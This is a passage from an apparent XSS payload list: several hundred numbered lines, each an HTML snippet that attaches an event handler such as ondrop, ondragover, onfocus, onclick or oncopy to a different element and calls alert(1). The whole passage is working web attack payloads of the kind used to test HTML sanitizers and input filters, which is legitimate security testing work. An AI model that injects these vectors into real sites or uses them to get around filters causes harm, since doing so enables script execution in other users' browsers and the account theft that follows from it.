1455 | <div draggable="true" contenteditable>drag me</div><details ondragover=alert(1) contenteditable>drop here</details>
1456 | <div draggable="true" contenteditable>drag me</div><details ondrop=alert(1) contenteditable>drop here</details>
1457 | <div draggable="true" contenteditable>drag me</div><dfn ondragover=alert(1) contenteditable>drop here</dfn>
1458 | <div draggable="true" contenteditable>drag me</div><dfn ondrop=alert(1) contenteditable>drop here</dfn>
1459 | <div draggable="true" contenteditable>drag me</div><dialog ondragover=alert(1) contenteditable>drop here</dialog>
1460 | <div draggable="true" contenteditable>drag me</div><dialog ondrop=alert(1) contenteditable>drop here</dialog>
1461 | <div draggable="true" contenteditable>drag me</div><dir ondragover=alert(1) contenteditable>drop here</dir>
1462 | <div draggable="true" contenteditable>drag me</div><dir ondrop=alert(1) contenteditable>drop here</dir>
1463 | <div draggable="true" contenteditable>drag me</div><div ondragover=alert(1) contenteditable>drop here</div>
1464 | <div draggable="true" contenteditable>drag me</div><div ondrop=alert(1) contenteditable>drop here</div>
1465 | <div draggable="true" contenteditable>drag me</div><dl ondragover=alert(1) contenteditable>drop here</dl>
1466 | <div draggable="true" contenteditable>drag me</div><dl ondrop=alert(1) contenteditable>drop here</dl>
1467 | <div draggable="true" contenteditable>drag me</div><dt ondragover=alert(1) contenteditable>drop here</dt>
1468 | <div draggable="true" contenteditable>drag me</div><dt ondrop=alert(1) contenteditable>drop here</dt>
1469 | <div draggable="true" contenteditable>drag me</div><element ondragover=alert(1) contenteditable>drop here</element>
1470 | <div draggable="true" contenteditable>drag me</div><element ondrop=alert(1) contenteditable>drop here</element>
1471 | <div draggable="true" contenteditable>drag me</div><em ondragover=alert(1) contenteditable>drop here</em>
1472 | <div draggable="true" contenteditable>drag me</div><em ondrop=alert(1) contenteditable>drop here</em>
1473 | <div draggable="true" contenteditable>drag me</div><embed ondragover=alert(1) contenteditable>drop here</embed>
1474 | <div draggable="true" contenteditable>drag me</div><embed ondrop=alert(1) contenteditable>drop here</embed>
1475 | <div draggable="true" contenteditable>drag me</div><fieldset ondragover=alert(1) contenteditable>drop here</fieldset>
1476 | <div draggable="true" contenteditable>drag me</div><fieldset ondrop=alert(1) contenteditable>drop here</fieldset>
1477 | <div draggable="true" contenteditable>drag me</div><figcaption ondragover=alert(1) contenteditable>drop here</figcaption>
1478 | <div draggable="true" contenteditable>drag me</div><figcaption ondrop=alert(1) contenteditable>drop here</figcaption>
1479 | <div draggable="true" contenteditable>drag me</div><figure ondragover=alert(1) contenteditable>drop here</figure>
1480 | <div draggable="true" contenteditable>drag me</div><figure ondrop=alert(1) contenteditable>drop here</figure>
1481 | <div draggable="true" contenteditable>drag me</div><font ondragover=alert(1) contenteditable>drop here</font>
1482 | <div draggable="true" contenteditable>drag me</div><font ondrop=alert(1) contenteditable>drop here</font>
1483 | <div draggable="true" contenteditable>drag me</div><footer ondragover=alert(1) contenteditable>drop here</footer>
1484 | <div draggable="true" contenteditable>drag me</div><footer ondrop=alert(1) contenteditable>drop here</footer>
1485 | <div draggable="true" contenteditable>drag me</div><form ondragover=alert(1) contenteditable>drop here</form>
1486 | <div draggable="true" contenteditable>drag me</div><form ondrop=alert(1) contenteditable>drop here</form>
1487 | <div draggable="true" contenteditable>drag me</div><frame ondragover=alert(1) contenteditable>drop here</frame>
1488 | <div draggable="true" contenteditable>drag me</div><frame ondrop=alert(1) contenteditable>drop here</frame>
1489 | <div draggable="true" contenteditable>drag me</div><frameset ondragover=alert(1) contenteditable>drop here</frameset>
1490 | <div draggable="true" contenteditable>drag me</div><frameset ondrop=alert(1) contenteditable>drop here</frameset>
1491 | <div draggable="true" contenteditable>drag me</div><h1 ondragover=alert(1) contenteditable>drop here</h1>
1492 | <div draggable="true" contenteditable>drag me</div><h1 ondrop=alert(1) contenteditable>drop here</h1>
1493 | <div draggable="true" contenteditable>drag me</div><head ondragover=alert(1) contenteditable>drop here</head>
1494 | <div draggable="true" contenteditable>drag me</div><head ondrop=alert(1) contenteditable>drop here</head>
1495 | <div draggable="true" contenteditable>drag me</div><header ondragover=alert(1) contenteditable>drop here</header>
1496 | <div draggable="true" contenteditable>drag me</div><header ondrop=alert(1) contenteditable>drop here</header>
1497 | <div draggable="true" contenteditable>drag me</div><hgroup ondragover=alert(1) contenteditable>drop here</hgroup>
1498 | <div draggable="true" contenteditable>drag me</div><hgroup ondrop=alert(1) contenteditable>drop here</hgroup>
1499 | <div draggable="true" contenteditable>drag me</div><hr ondragover=alert(1) contenteditable>drop here</hr>
1500 | <div draggable="true" contenteditable>drag me</div><hr ondrop=alert(1) contenteditable>drop here</hr>
1501 | <div draggable="true" contenteditable>drag me</div><html ondragover=alert(1) contenteditable>drop here</html>
1502 | <div draggable="true" contenteditable>drag me</div><html ondrop=alert(1) contenteditable>drop here</html>
1503 | <div draggable="true" contenteditable>drag me</div><i ondragover=alert(1) contenteditable>drop here</i>
1504 | <div draggable="true" contenteditable>drag me</div><i ondrop=alert(1) contenteditable>drop here</i>
1505 | <div draggable="true" contenteditable>drag me</div><iframe ondragover=alert(1) contenteditable>drop here</iframe>
1506 | <div draggable="true" contenteditable>drag me</div><iframe ondrop=alert(1) contenteditable>drop here</iframe>
1507 | <div draggable="true" contenteditable>drag me</div><image ondragover=alert(1) contenteditable>drop here</image>
1508 | <div draggable="true" contenteditable>drag me</div><image ondrop=alert(1) contenteditable>drop here</image>
1509 | <div draggable="true" contenteditable>drag me</div><img ondragover=alert(1) contenteditable>drop here</img>
1510 | <div draggable="true" contenteditable>drag me</div><img ondrop=alert(1) contenteditable>drop here</img>
1511 | <div draggable="true" contenteditable>drag me</div><input ondragover=alert(1) contenteditable>drop here</input>
1512 | <div draggable="true" contenteditable>drag me</div><input ondrop=alert(1) contenteditable>drop here</input>
1513 | <div draggable="true" contenteditable>drag me</div><ins ondragover=alert(1) contenteditable>drop here</ins>
1514 | <div draggable="true" contenteditable>drag me</div><ins ondrop=alert(1) contenteditable>drop here</ins>
1515 | <div draggable="true" contenteditable>drag me</div><isindex ondragover=alert(1) contenteditable>drop here</isindex>
1516 | <div draggable="true" contenteditable>drag me</div><isindex ondrop=alert(1) contenteditable>drop here</isindex>
1517 | <div draggable="true" contenteditable>drag me</div><kbd ondragover=alert(1) contenteditable>drop here</kbd>
1518 | <div draggable="true" contenteditable>drag me</div><kbd ondrop=alert(1) contenteditable>drop here</kbd>
1519 | <div draggable="true" contenteditable>drag me</div><keygen ondragover=alert(1) contenteditable>drop here</keygen>
1520 | <div draggable="true" contenteditable>drag me</div><keygen ondrop=alert(1) contenteditable>drop here</keygen>
1521 | <div draggable="true" contenteditable>drag me</div><label ondragover=alert(1) contenteditable>drop here</label>
1522 | <div draggable="true" contenteditable>drag me</div><label ondrop=alert(1) contenteditable>drop here</label>
1523 | <div draggable="true" contenteditable>drag me</div><legend ondragover=alert(1) contenteditable>drop here</legend>
1524 | <div draggable="true" contenteditable>drag me</div><legend ondrop=alert(1) contenteditable>drop here</legend>
1525 | <div draggable="true" contenteditable>drag me</div><li ondragover=alert(1) contenteditable>drop here</li>
1526 | <div draggable="true" contenteditable>drag me</div><li ondrop=alert(1) contenteditable>drop here</li>
1527 | <div draggable="true" contenteditable>drag me</div><link ondragover=alert(1) contenteditable>drop here</link>
1528 | <div draggable="true" contenteditable>drag me</div><link ondrop=alert(1) contenteditable>drop here</link>
1529 | <div draggable="true" contenteditable>drag me</div><listing ondragover=alert(1) contenteditable>drop here</listing>
1530 | <div draggable="true" contenteditable>drag me</div><listing ondrop=alert(1) contenteditable>drop here</listing>
1531 | <div draggable="true" contenteditable>drag me</div><main ondragover=alert(1) contenteditable>drop here</main>
1532 | <div draggable="true" contenteditable>drag me</div><main ondrop=alert(1) contenteditable>drop here</main>
1533 | <div draggable="true" contenteditable>drag me</div><map ondragover=alert(1) contenteditable>drop here</map>
1534 | <div draggable="true" contenteditable>drag me</div><map ondrop=alert(1) contenteditable>drop here</map>
1535 | <div draggable="true" contenteditable>drag me</div><mark ondragover=alert(1) contenteditable>drop here</mark>
1536 | <div draggable="true" contenteditable>drag me</div><mark ondrop=alert(1) contenteditable>drop here</mark>
1537 | <div draggable="true" contenteditable>drag me</div><marquee ondragover=alert(1) contenteditable>drop here</marquee>
1538 | <div draggable="true" contenteditable>drag me</div><marquee ondrop=alert(1) contenteditable>drop here</marquee>
1539 | <div draggable="true" contenteditable>drag me</div><menu ondragover=alert(1) contenteditable>drop here</menu>
1540 | <div draggable="true" contenteditable>drag me</div><menu ondrop=alert(1) contenteditable>drop here</menu>
1541 | <div draggable="true" contenteditable>drag me</div><menuitem ondragover=alert(1) contenteditable>drop here</menuitem>
1542 | <div draggable="true" contenteditable>drag me</div><menuitem ondrop=alert(1) contenteditable>drop here</menuitem>
1543 | <div draggable="true" contenteditable>drag me</div><meta ondragover=alert(1) contenteditable>drop here</meta>
1544 | <div draggable="true" contenteditable>drag me</div><meta ondrop=alert(1) contenteditable>drop here</meta>
1545 | <div draggable="true" contenteditable>drag me</div><meter ondragover=alert(1) contenteditable>drop here</meter>
1546 | <div draggable="true" contenteditable>drag me</div><meter ondrop=alert(1) contenteditable>drop here</meter>
1547 | <div draggable="true" contenteditable>drag me</div><multicol ondragover=alert(1) contenteditable>drop here</multicol>
1548 | <div draggable="true" contenteditable>drag me</div><multicol ondrop=alert(1) contenteditable>drop here</multicol>
1549 | <div draggable="true" contenteditable>drag me</div><nav ondragover=alert(1) contenteditable>drop here</nav>
1550 | <div draggable="true" contenteditable>drag me</div><nav ondrop=alert(1) contenteditable>drop here</nav>
1551 | <div draggable="true" contenteditable>drag me</div><nextid ondragover=alert(1) contenteditable>drop here</nextid>
1552 | <div draggable="true" contenteditable>drag me</div><nextid ondrop=alert(1) contenteditable>drop here</nextid>
1553 | <div draggable="true" contenteditable>drag me</div><nobr ondragover=alert(1) contenteditable>drop here</nobr>
1554 | <div draggable="true" contenteditable>drag me</div><nobr ondrop=alert(1) contenteditable>drop here</nobr>
1555 | <div draggable="true" contenteditable>drag me</div><noembed ondragover=alert(1) contenteditable>drop here</noembed>
1556 | <div draggable="true" contenteditable>drag me</div><noembed ondrop=alert(1) contenteditable>drop here</noembed>
1557 | <div draggable="true" contenteditable>drag me</div><noframes ondragover=alert(1) contenteditable>drop here</noframes>
1558 | <div draggable="true" contenteditable>drag me</div><noframes ondrop=alert(1) contenteditable>drop here</noframes>
1559 | <div draggable="true" contenteditable>drag me</div><noscript ondragover=alert(1) contenteditable>drop here</noscript>
1560 | <div draggable="true" contenteditable>drag me</div><noscript ondrop=alert(1) contenteditable>drop here</noscript>
1561 | <div draggable="true" contenteditable>drag me</div><object ondragover=alert(1) contenteditable>drop here</object>
1562 | <div draggable="true" contenteditable>drag me</div><object ondrop=alert(1) contenteditable>drop here</object>
1563 | <div draggable="true" contenteditable>drag me</div><ol ondragover=alert(1) contenteditable>drop here</ol>
1564 | <div draggable="true" contenteditable>drag me</div><ol ondrop=alert(1) contenteditable>drop here</ol>
1565 | <div draggable="true" contenteditable>drag me</div><optgroup ondragover=alert(1) contenteditable>drop here</optgroup>
1566 | <div draggable="true" contenteditable>drag me</div><optgroup ondrop=alert(1) contenteditable>drop here</optgroup>
1567 | <div draggable="true" contenteditable>drag me</div><option ondragover=alert(1) contenteditable>drop here</option>
1568 | <div draggable="true" contenteditable>drag me</div><option ondrop=alert(1) contenteditable>drop here</option>
1569 | <div draggable="true" contenteditable>drag me</div><output ondragover=alert(1) contenteditable>drop here</output>
1570 | <div draggable="true" contenteditable>drag me</div><output ondrop=alert(1) contenteditable>drop here</output>
1571 | <div draggable="true" contenteditable>drag me</div><p ondragover=alert(1) contenteditable>drop here</p>
1572 | <div draggable="true" contenteditable>drag me</div><p ondrop=alert(1) contenteditable>drop here</p>
1573 | <div draggable="true" contenteditable>drag me</div><param ondragover=alert(1) contenteditable>drop here</param>
1574 | <div draggable="true" contenteditable>drag me</div><param ondrop=alert(1) contenteditable>drop here</param>
1575 | <div draggable="true" contenteditable>drag me</div><picture ondragover=alert(1) contenteditable>drop here</picture>
1576 | <div draggable="true" contenteditable>drag me</div><picture ondrop=alert(1) contenteditable>drop here</picture>
1577 | <div draggable="true" contenteditable>drag me</div><plaintext ondragover=alert(1) contenteditable>drop here</plaintext>
1578 | <div draggable="true" contenteditable>drag me</div><plaintext ondrop=alert(1) contenteditable>drop here</plaintext>
1579 | <div draggable="true" contenteditable>drag me</div><pre ondragover=alert(1) contenteditable>drop here</pre>
1580 | <div draggable="true" contenteditable>drag me</div><pre ondrop=alert(1) contenteditable>drop here</pre>
1581 | <div draggable="true" contenteditable>drag me</div><progress ondragover=alert(1) contenteditable>drop here</progress>
1582 | <div draggable="true" contenteditable>drag me</div><progress ondrop=alert(1) contenteditable>drop here</progress>
1583 | <div draggable="true" contenteditable>drag me</div><q ondragover=alert(1) contenteditable>drop here</q>
1584 | <div draggable="true" contenteditable>drag me</div><q ondrop=alert(1) contenteditable>drop here</q>
1585 | <div draggable="true" contenteditable>drag me</div><rb ondragover=alert(1) contenteditable>drop here</rb>
1586 | <div draggable="true" contenteditable>drag me</div><rb ondrop=alert(1) contenteditable>drop here</rb>
1587 | <div draggable="true" contenteditable>drag me</div><rp ondragover=alert(1) contenteditable>drop here</rp>
1588 | <div draggable="true" contenteditable>drag me</div><rp ondrop=alert(1) contenteditable>drop here</rp>
1589 | <div draggable="true" contenteditable>drag me</div><rt ondragover=alert(1) contenteditable>drop here</rt>
1590 | <div draggable="true" contenteditable>drag me</div><rt ondrop=alert(1) contenteditable>drop here</rt>
1591 | <div draggable="true" contenteditable>drag me</div><rtc ondragover=alert(1) contenteditable>drop here</rtc>
1592 | <div draggable="true" contenteditable>drag me</div><rtc ondrop=alert(1) contenteditable>drop here</rtc>
1593 | <div draggable="true" contenteditable>drag me</div><ruby ondragover=alert(1) contenteditable>drop here</ruby>
1594 | <div draggable="true" contenteditable>drag me</div><ruby ondrop=alert(1) contenteditable>drop here</ruby>
1595 | <div draggable="true" contenteditable>drag me</div><s ondragover=alert(1) contenteditable>drop here</s>
1596 | <div draggable="true" contenteditable>drag me</div><s ondrop=alert(1) contenteditable>drop here</s>
1597 | <div draggable="true" contenteditable>drag me</div><samp ondragover=alert(1) contenteditable>drop here</samp>
1598 | <div draggable="true" contenteditable>drag me</div><samp ondrop=alert(1) contenteditable>drop here</samp>
1599 | <div draggable="true" contenteditable>drag me</div><script ondragover=alert(1) contenteditable>drop here</script>
1600 | <div draggable="true" contenteditable>drag me</div><script ondrop=alert(1) contenteditable>drop here</script>
1601 | <div draggable="true" contenteditable>drag me</div><section ondragover=alert(1) contenteditable>drop here</section>
1602 | <div draggable="true" contenteditable>drag me</div><section ondrop=alert(1) contenteditable>drop here</section>
1603 | <div draggable="true" contenteditable>drag me</div><select ondragover=alert(1) contenteditable>drop here</select>
1604 | <div draggable="true" contenteditable>drag me</div><select ondrop=alert(1) contenteditable>drop here</select>
1605 | <div draggable="true" contenteditable>drag me</div><shadow ondragover=alert(1) contenteditable>drop here</shadow>
1606 | <div draggable="true" contenteditable>drag me</div><shadow ondrop=alert(1) contenteditable>drop here</shadow>
1607 | <div draggable="true" contenteditable>drag me</div><slot ondragover=alert(1) contenteditable>drop here</slot>
1608 | <div draggable="true" contenteditable>drag me</div><slot ondrop=alert(1) contenteditable>drop here</slot>
1609 | <div draggable="true" contenteditable>drag me</div><small ondragover=alert(1) contenteditable>drop here</small>
1610 | <div draggable="true" contenteditable>drag me</div><small ondrop=alert(1) contenteditable>drop here</small>
1611 | <div draggable="true" contenteditable>drag me</div><source ondragover=alert(1) contenteditable>drop here</source>
1612 | <div draggable="true" contenteditable>drag me</div><source ondrop=alert(1) contenteditable>drop here</source>
1613 | <div draggable="true" contenteditable>drag me</div><spacer ondragover=alert(1) contenteditable>drop here</spacer>
1614 | <div draggable="true" contenteditable>drag me</div><spacer ondrop=alert(1) contenteditable>drop here</spacer>
1615 | <div draggable="true" contenteditable>drag me</div><span ondragover=alert(1) contenteditable>drop here</span>
1616 | <div draggable="true" contenteditable>drag me</div><span ondrop=alert(1) contenteditable>drop here</span>
1617 | <div draggable="true" contenteditable>drag me</div><strike ondragover=alert(1) contenteditable>drop here</strike>
1618 | <div draggable="true" contenteditable>drag me</div><strike ondrop=alert(1) contenteditable>drop here</strike>
1619 | <div draggable="true" contenteditable>drag me</div><strong ondragover=alert(1) contenteditable>drop here</strong>
1620 | <div draggable="true" contenteditable>drag me</div><strong ondrop=alert(1) contenteditable>drop here</strong>
1621 | <div draggable="true" contenteditable>drag me</div><style ondragover=alert(1) contenteditable>drop here</style>
1622 | <div draggable="true" contenteditable>drag me</div><style ondrop=alert(1) contenteditable>drop here</style>
1623 | <div draggable="true" contenteditable>drag me</div><sub ondragover=alert(1) contenteditable>drop here</sub>
1624 | <div draggable="true" contenteditable>drag me</div><sub ondrop=alert(1) contenteditable>drop here</sub>
1625 | <div draggable="true" contenteditable>drag me</div><summary ondragover=alert(1) contenteditable>drop here</summary>
1626 | <div draggable="true" contenteditable>drag me</div><summary ondrop=alert(1) contenteditable>drop here</summary>
1627 | <div draggable="true" contenteditable>drag me</div><sup ondragover=alert(1) contenteditable>drop here</sup>
1628 | <div draggable="true" contenteditable>drag me</div><sup ondrop=alert(1) contenteditable>drop here</sup>
1629 | <div draggable="true" contenteditable>drag me</div><svg ondragover=alert(1) contenteditable>drop here</svg>
1630 | <div draggable="true" contenteditable>drag me</div><svg ondrop=alert(1) contenteditable>drop here</svg>
1631 | <div draggable="true" contenteditable>drag me</div><table ondragover=alert(1) contenteditable>drop here</table>
1632 | <div draggable="true" contenteditable>drag me</div><table ondrop=alert(1) contenteditable>drop here</table>
1633 | <div draggable="true" contenteditable>drag me</div><tbody ondragover=alert(1) contenteditable>drop here</tbody>
1634 | <div draggable="true" contenteditable>drag me</div><tbody ondrop=alert(1) contenteditable>drop here</tbody>
1635 | <div draggable="true" contenteditable>drag me</div><td ondragover=alert(1) contenteditable>drop here</td>
1636 | <div draggable="true" contenteditable>drag me</div><td ondrop=alert(1) contenteditable>drop here</td>
1637 | <div draggable="true" contenteditable>drag me</div><template ondragover=alert(1) contenteditable>drop here</template>
1638 | <div draggable="true" contenteditable>drag me</div><template ondrop=alert(1) contenteditable>drop here</template>
1639 | <div draggable="true" contenteditable>drag me</div><textarea ondragover=alert(1) contenteditable>drop here</textarea>
1640 | <div draggable="true" contenteditable>drag me</div><textarea ondrop=alert(1) contenteditable>drop here</textarea>
1641 | <div draggable="true" contenteditable>drag me</div><tfoot ondragover=alert(1) contenteditable>drop here</tfoot>
1642 | <div draggable="true" contenteditable>drag me</div><tfoot ondrop=alert(1) contenteditable>drop here</tfoot>
1643 | <div draggable="true" contenteditable>drag me</div><th ondragover=alert(1) contenteditable>drop here</th>
1644 | <div draggable="true" contenteditable>drag me</div><th ondrop=alert(1) contenteditable>drop here</th>
1645 | <div draggable="true" contenteditable>drag me</div><thead ondragover=alert(1) contenteditable>drop here</thead>
1646 | <div draggable="true" contenteditable>drag me</div><thead ondrop=alert(1) contenteditable>drop here</thead>
1647 | <div draggable="true" contenteditable>drag me</div><time ondragover=alert(1) contenteditable>drop here</time>
1648 | <div draggable="true" contenteditable>drag me</div><time ondrop=alert(1) contenteditable>drop here</time>
1649 | <div draggable="true" contenteditable>drag me</div><title ondragover=alert(1) contenteditable>drop here</title>
1650 | <div draggable="true" contenteditable>drag me</div><title ondrop=alert(1) contenteditable>drop here</title>
1651 | <div draggable="true" contenteditable>drag me</div><tr ondragover=alert(1) contenteditable>drop here</tr>
1652 | <div draggable="true" contenteditable>drag me</div><tr ondrop=alert(1) contenteditable>drop here</tr>
1653 | <div draggable="true" contenteditable>drag me</div><track ondragover=alert(1) contenteditable>drop here</track>
1654 | <div draggable="true" contenteditable>drag me</div><track ondrop=alert(1) contenteditable>drop here</track>
1655 | <div draggable="true" contenteditable>drag me</div><tt ondragover=alert(1) contenteditable>drop here</tt>
1656 | <div draggable="true" contenteditable>drag me</div><tt ondrop=alert(1) contenteditable>drop here</tt>
1657 | <div draggable="true" contenteditable>drag me</div><u ondragover=alert(1) contenteditable>drop here</u>
1658 | <div draggable="true" contenteditable>drag me</div><u ondrop=alert(1) contenteditable>drop here</u>
1659 | <div draggable="true" contenteditable>drag me</div><ul ondragover=alert(1) contenteditable>drop here</ul>
1660 | <div draggable="true" contenteditable>drag me</div><ul ondrop=alert(1) contenteditable>drop here</ul>
1661 | <div draggable="true" contenteditable>drag me</div><var ondragover=alert(1) contenteditable>drop here</var>
1662 | <div draggable="true" contenteditable>drag me</div><var ondrop=alert(1) contenteditable>drop here</var>
1663 | <div draggable="true" contenteditable>drag me</div><video ondragover=alert(1) contenteditable>drop here</video>
1664 | <div draggable="true" contenteditable>drag me</div><video ondrop=alert(1) contenteditable>drop here</video>
1665 | <div draggable="true" contenteditable>drag me</div><wbr ondragover=alert(1) contenteditable>drop here</wbr>
1666 | <div draggable="true" contenteditable>drag me</div><wbr ondrop=alert(1) contenteditable>drop here</wbr>
1667 | <div draggable="true" contenteditable>drag me</div><xmp ondragover=alert(1) contenteditable>drop here</xmp>
1668 | <div draggable="true" contenteditable>drag me</div><xmp ondrop=alert(1) contenteditable>drop here</xmp>
1669 | <div draggable="true" ondrag="alert(1)">test</div>
1670 | <div draggable="true" ondragend="alert(1)">test</div>
1671 | <div draggable="true" ondragenter="alert(1)">test</div>
1672 | <div draggable="true" ondragleave="alert(1)">test</div>
1673 | <div draggable="true" ondragstart="alert(1)">test</div>
1674 | <div id=x tabindex=1 onactivate=alert(1)></div>
1675 | <div id=x tabindex=1 onbeforeactivate=alert(1)></div>
1676 | <div id=x tabindex=1 onbeforedeactivate=alert(1)></div><input autofocus>
1677 | <div id=x tabindex=1 ondeactivate=alert(1)></div><input id=y autofocus>
1678 | <div id=x tabindex=1 onfocus=alert(1)></div>
1679 | <div id=x tabindex=1 onfocusin=alert(1)></div>
1680 | <div onbeforecopy="alert(1)" contenteditable>test</div>
1681 | <div onbeforecut="alert(1)" contenteditable>test</div>
1682 | <div onbeforepaste="alert(1)" contenteditable>test</div>
1683 | <div onblur=alert(1) tabindex=1 id=x></div><input autofocus>
1684 | <div onclick="alert(1)">test</div>
1685 | <div oncontextmenu="alert(1)">test</div>
1686 | <div oncopy="alert(1)" contenteditable>test</div>
1687 | <div oncut="alert(1)" contenteditable>test</div>
1688 | <div ondblclick="alert(1)">test</div>
1689 | <div onfocusout=alert(1) tabindex=1 id=x></div><input autofocus>
1690 | <div onkeydown="alert(1)" contenteditable>test</div>
1691 | <div onkeypress="alert(1)" contenteditable>test</div>
1692 | <div onkeyup="alert(1)" contenteditable>test</div>
1693 | <div onmousedown="alert(1)">test</div>
1694 | <div onmouseenter="alert(1)">test</div>
1695 | <div onmouseleave="alert(1)">test</div>
1696 | <div onmousemove="alert(1)">test</div>
1697 | <div onmouseout="alert(1)">test</div>
1698 | <div onmouseover="alert(1)">test</div>
1699 | <div onmouseup="alert(1)">test</div>
1700 | <div onpaste="alert(1)" contenteditable>test</div>
1701 | <dl draggable="true" ondrag="alert(1)">test</dl>
1702 | <dl draggable="true" ondragend="alert(1)">test</dl>
1703 | <dl draggable="true" ondragenter="alert(1)">test</dl>
1704 | <dl draggable="true" ondragleave="alert(1)">test</dl>
1705 | <dl draggable="true" ondragstart="alert(1)">test</dl>
1706 | <dl id=x tabindex=1 onactivate=alert(1)></dl>
1707 | <dl id=x tabindex=1 onbeforeactivate=alert(1)></dl>
1708 | <dl id=x tabindex=1 onbeforedeactivate=alert(1)></dl><input autofocus>
1709 | <dl id=x tabindex=1 ondeactivate=alert(1)></dl><input id=y autofocus>
1710 | <dl id=x tabindex=1 onfocus=alert(1)></dl>
1711 | <dl id=x tabindex=1 onfocusin=alert(1)></dl>
1712 | <dl onbeforecopy="alert(1)" contenteditable>test</dl>
1713 | <dl onbeforecut="alert(1)" contenteditable>test</dl>
1714 | <dl onbeforepaste="alert(1)" contenteditable>test</dl>
1715 | <dl onblur=alert(1) tabindex=1 id=x></dl><input autofocus>
1716 | <dl onclick="alert(1)">test</dl>
1717 | <dl oncontextmenu="alert(1)">test</dl>
1718 | <dl oncopy="alert(1)" contenteditable>test</dl>
1719 | <dl oncut="alert(1)" contenteditable>test</dl>
1720 | <dl ondblclick="alert(1)">test</dl>
1721 | <dl onfocusout=alert(1) tabindex=1 id=x></dl><input autofocus>
1722 | <dl onkeydown="alert(1)" contenteditable>test</dl>
1723 | <dl onkeypress="alert(1)" contenteditable>test</dl>
1724 | <dl onkeyup="alert(1)" contenteditable>test</dl>
1725 | <dl onmousedown="alert(1)">test</dl>
1726 | <dl onmouseenter="alert(1)">test</dl>
1727 | <dl onmouseleave="alert(1)">test</dl>
1728 | <dl onmousemove="alert(1)">test</dl>
1729 | <dl onmouseout="alert(1)">test</dl>
1730 | <dl onmouseover="alert(1)">test</dl>
1731 | <dl onmouseup="alert(1)">test</dl>
1732 | <dl onpaste="alert(1)" contenteditable>test</dl>
1733 | <dt draggable="true" ondrag="alert(1)">test</dt>
1734 | <dt draggable="true" ondragend="alert(1)">test</dt>
1735 | <dt draggable="true" ondragenter="alert(1)">test</dt>
1736 | <dt draggable="true" ondragleave="alert(1)">test</dt>
1737 | <dt draggable="true" ondragstart="alert(1)">test</dt>
1738 | <dt id=x tabindex=1 onactivate=alert(1)></dt>
1739 | <dt id=x tabindex=1 onbeforeactivate=alert(1)></dt>
1740 | <dt id=x tabindex=1 onbeforedeactivate=alert(1)></dt><input autofocus>
1741 | <dt id=x tabindex=1 ondeactivate=alert(1)></dt><input id=y autofocus>
1742 | <dt id=x tabindex=1 onfocus=alert(1)></dt>
1743 | <dt id=x tabindex=1 onfocusin=alert(1)></dt>
1744 | <dt onbeforecopy="alert(1)" contenteditable>test</dt>
1745 | <dt onbeforecut="alert(1)" contenteditable>test</dt>
1746 | <dt onbeforepaste="alert(1)" contenteditable>test</dt>
1747 | <dt onblur=alert(1) tabindex=1 id=x></dt><input autofocus>
1748 | <dt onclick="alert(1)">test</dt>
1749 | <dt oncontextmenu="alert(1)">test</dt>
1750 | <dt oncopy="alert(1)" contenteditable>test</dt>
1751 | <dt oncut="alert(1)" contenteditable>test</dt>
1752 | <dt ondblclick="alert(1)">test</dt>
1753 | <dt onfocusout=alert(1) tabindex=1 id=x></dt><input autofocus>
1754 | <dt onkeydown="alert(1)" contenteditable>test</dt>
1755 | <dt onkeypress="alert(1)" contenteditable>test</dt>
1756 | <dt onkeyup="alert(1)" contenteditable>test</dt>
1757 | <dt onmousedown="alert(1)">test</dt>
1758 | <dt onmouseenter="alert(1)">test</dt>
1759 | <dt onmouseleave="alert(1)">test</dt>
1760 | <dt onmousemove="alert(1)">test</dt>
1761 | <dt onmouseout="alert(1)">test</dt>
1762 | <dt onmouseover="alert(1)">test</dt>
1763 | <dt onmouseup="alert(1)">test</dt>
1764 | <dt onpaste="alert(1)" contenteditable>test</dt>
1765 | <element draggable="true" ondrag="alert(1)">test</element>
1766 | <element draggable="true" ondragend="alert(1)">test</element>
1767 | <element draggable="true" ondragenter="alert(1)">test</element>
1768 | <element draggable="true" ondragleave="alert(1)">test</element>
1769 | <element draggable="true" ondragstart="alert(1)">test</element>
1770 | <element id=x tabindex=1 onactivate=alert(1)></element>
1771 | <element id=x tabindex=1 onbeforeactivate=alert(1)></element>
1772 | <element id=x tabindex=1 onbeforedeactivate=alert(1)></element><input autofocus>
1773 | <element id=x tabindex=1 ondeactivate=alert(1)></element><input id=y autofocus>
1774 | <element id=x tabindex=1 onfocus=alert(1)></element>
1775 | <element id=x tabindex=1 onfocusin=alert(1)></element>
1776 | <element onbeforecopy="alert(1)" contenteditable>test</element>
1777 | <element onbeforecut="alert(1)" contenteditable>test</element>
1778 | <element onbeforepaste="alert(1)" contenteditable>test</element>
1779 | <element onblur=alert(1) tabindex=1 id=x></element><input autofocus>
1780 | <element onclick="alert(1)">test</element>
1781 | <element oncontextmenu="alert(1)">test</element>
1782 | <element oncopy="alert(1)" contenteditable>test</element>
1783 | <element oncut="alert(1)" contenteditable>test</element>
1784 | <element ondblclick="alert(1)">test</element>
1785 | <element onfocusout=alert(1) tabindex=1 id=x></element><input autofocus>
1786 | <element onkeydown="alert(1)" contenteditable>test</element>
1787 | <element onkeypress="alert(1)" contenteditable>test</element>
1788 | <element onkeyup="alert(1)" contenteditable>test</element>
1789 | <element onmousedown="alert(1)">test</element>
1790 | <element onmouseenter="alert(1)">test</element>
1791 | <element onmouseleave="alert(1)">test</element>
1792 | <element onmousemove="alert(1)">test</element>
1793 | <element onmouseout="alert(1)">test</element>
1794 | <element onmouseover="alert(1)">test</element>
1795 | <element onmouseup="alert(1)">test</element>
1796 | <element onpaste="alert(1)" contenteditable>test</element>
1797 | <em draggable="true" ondrag="alert(1)">test</em>
1798 | <em draggable="true" ondragend="alert(1)">test</em>
1799 | <em draggable="true" ondragenter="alert(1)">test</em>
1800 | <em draggable="true" ondragleave="alert(1)">test</em>
1801 | <em draggable="true" ondragstart="alert(1)">test</em>
1802 | <em id=x tabindex=1 onactivate=alert(1)></em>
1803 | <em id=x tabindex=1 onbeforeactivate=alert(1)></em>
1804 | <em id=x tabindex=1 onbeforedeactivate=alert(1)></em><input autofocus>
1805 | <em id=x tabindex=1 ondeactivate=alert(1)></em><input id=y autofocus>
1806 | <em id=x tabindex=1 onfocus=alert(1)></em>
1807 | <em id=x tabindex=1 onfocusin=alert(1)></em>
1808 | <em onbeforecopy="alert(1)" contenteditable>test</em>
1809 | <em onbeforecut="alert(1)" contenteditable>test</em>
1810 | <em onbeforepaste="alert(1)" contenteditable>test</em>
1811 | <em onblur=alert(1) tabindex=1 id=x></em><input autofocus>
1812 | <em onclick="alert(1)">test</em>
1813 | <em oncontextmenu="alert(1)">test</em>
